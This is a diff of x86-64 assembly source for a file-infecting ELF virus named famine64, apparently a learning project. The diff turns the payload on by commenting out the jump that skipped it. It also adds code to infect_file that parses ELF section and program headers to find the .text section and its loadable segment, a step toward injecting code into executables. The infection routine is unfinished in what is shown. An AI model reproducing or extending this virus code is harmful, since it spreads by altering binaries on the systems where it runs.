@@ -16,13 +16,12 @@
 
 	segment .text
 
-famine64_func:
 	famine64_signature dq 0x42CAFE4224EFAC24
-
+famine64_func:
 	push	rax
 	push	rdi
 	sub		rsp, 0x10
-	jmp famine64_end
+	;jmp famine64_end
 
 	mov		QWORD[rsp], 0
 dir_loop:
@@ -119,15 +118,8 @@ find_files_end:
 ;;                                                                            ;;
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 get_dat_elf:
-	push	rax
-	push	rcx
-	push	rdx
-	push	rdi
-	push	rsi
-	push	r8
-	push	r9
-	push	r10
-	push	r11
+	push	rbp
+	push	rbx
 	sub		rsp, 1024				; char path[1024]
 									; [rsp]
 
@@ -215,8 +207,9 @@ open_file:
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 	;; int	read(fd, buf, 1024)                                              ;;
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-	sub		rsp, 1040					; int i,     int j, char buf[1024],    int ret
-										; [rsp], [rsp + 4],      [rsp + 8], [rsp + 1032]
+	sub		rsp, 1040
+	; int i, int j    , char buf[1024], int ret
+	; [rsp], [rsp + 4], [rsp + 8]     , [rsp + 1032]
 	mov		DWORD [rsp], 0				; i = 0
 	mov		DWORD [rsp + 4], 0			; j = 0
 
@@ -282,22 +275,15 @@ munmap_file:
 	syscall
 get_dat_elf_end:
 	add		rsp, 1040
-	pop		r11
-	pop		r10
-	pop		r9
-	pop		r8
-	pop		rsi
-	pop		rdi
-	pop		rdx
-	pop		rcx
-	pop		rax
+	pop		rbx
+	pop		rbp
 	ret
 
-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-;;                                                                            ;;
-;;              void check_file(int size, char *data)                         ;;
-;;                                                                            ;;
-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;                                                                           ;;
+;;              void check_file(int size, char *data)                        ;;
+;;                                                                           ;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 check_file:
 	xor		rax, rax
 	;; Check header integrity
@@ -345,11 +331,11 @@ check_file:
 check_end:
 	ret
 
-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-;;                                                                            ;;
-;;              void infect_file(char *path, int size, char *data)            ;;
-;;                                                                            ;;
-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;                                                                           ;;
+;;            void infect_file(char *path, int size, char *data)             ;;
+;;                                                                           ;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 infect_file:
 	push	r15
 	push	r14
@@ -357,7 +343,70 @@ infect_file:
 	push	r12
 	push	rbp
 	push	rbx
+	sub		rsp, 48
 
+	;; Elf64_Phdr *program, Elf64_Phdr *iprogram, Elf64_Shdr *section,
+	;; [rsp]              , [rsp + 8]           , [rsp + 16]         ,
+	;; Elf64_Shdr *isection, char *s_table
+	;; [rsp + 24]          , [rsp + 32]   = 40
+	mov		rax, rdx
+	add		rax, QWORD [rdx + 32]		; Program table start
+	mov		QWORD [rsp], rax
+	mov		QWORD [rsp + 8], 0			; .TEXT Program pointer = NULL
+	mov		rax, rdx
+	add		rax, QWORD [rdx + 40]		; Section table start
+	mov		QWORD [rsp + 16], rax
+	mov		QWORD [rsp + 24], 0			; .text Section pointer = NULL
+	
+	movzx	eax, WORD [rdx + 62]		; ->e_shstrndx
+	imul	ax, WORD [rdx + 58]			; ... * ->e_shentsize
+	add		rax, QWORD [rsp + 16]		; section[idx]
+	mov		rax, QWORD [rax + 24]		; section[idx].sh_offset
+	add		rax, rdx					; data + section[idx].sh_offset = s_table
+	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+	;; 1. Find the memory mapped PT_LOAD segment that contains the .text     ;;
+	;;    section.                                                           ;;
+	;;    R8 will store it.                                                  ;;
+	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+	mov		rbx, 0
+find_text_section:
+	cmp		bx, WORD [rdx + 60]			; i < ->e_shnum ?
+	jae		find_text_end
+	xor		rcx, rcx
+	mov		cx, WORD [rdx + 58]			; ->e_shentsize
+	imul	ecx, ebx
+	add		rcx, QWORD [rsp + 16]		; section[i]
+	mov		ecx, DWORD [rcx]			; section[i].sh_name
+	add		rcx, rax					; s_table + section[i].sh_name
+	cmp		DWORD [rcx], 0x7865742e		; == ".tex"
+	je		find_text_section_name
+	add		rbx, 1
+	jmp		find_text_section
+find_text_section_name:
+	cmp		WORD [rcx + 4], 0x74		; == "t"
+	je		find_text_next
+	add		rbx, 1
+	jmp		find_text_section
+find_text_next:
+	imul	bx, WORD [rdx + 58]			; i * ->e_shentsize
+	add		rbx, QWORD [rsp + 16]		; Elf64_Shdr *section + i * ->e_shentsize
+	mov		QWORD [rsp + 24], rbx		; Elf64_Shdr *isection !
+	mov		rbx, 0
+find_text_segment:
+	cmp		bx, WORD [rdx + 56]			; j < ->e_phnum ?
+	jae		find_text_end
+	xor		rcx, rcx
+	mov		cx, WORD [rdx + 54]			; ->e_phentsize
+	imul	ecx, ebx
+	add		rcx, QWORD [rsp]			; program[j]
+	cmp		DWORD [rcx], 1				; program[j].p_type == PT_LOAD ?
+	add		rbx, 1
+	jne		find_text_segment
+	mov		r8, QWORD [rsp + 24]		; isection
+	mov		r8, QWORD [r8 + 24]			; isection->sh_offset
+	cmp		r8, QWORD [rcx + 16]		; isection->sh_offset >= program[j].p_vaddr ?
+	jl		find_text_segment
+find_text_end:
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 	;; 1. Find the memory mapped PT_LOAD segment that contains entry point   ;;
 	;;    R8 will store it.                                                  ;;
